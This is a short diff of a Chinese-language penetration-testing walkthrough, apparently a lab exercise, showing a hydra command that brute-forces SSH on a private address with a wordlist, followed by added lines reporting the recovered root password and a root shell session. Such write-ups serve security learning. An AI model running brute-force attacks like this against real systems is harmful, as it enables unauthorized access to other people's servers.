@@ -472,4 +472,11 @@ Root1
 使用hydra对192.168.1.7 SSH服务进行爆破`hydra -L /root/桌面/wordlist.txt -P /root/桌面/wordlist.txt -t 6 ssh://192.168.1.7 #-t将线程调低为了保证稳定性`
 
 ![](/media/hydra.png)
+得到服务器的root账户的口令，ssh连接为root权限
+```go
+Your Hardware Enablement Stack (HWE) is supported until April 2017.
 
+Last login: Wed Jun 26 02:47:23 2019 from 192.168.1.6
+root@indishell:~# whoami
+root
+```
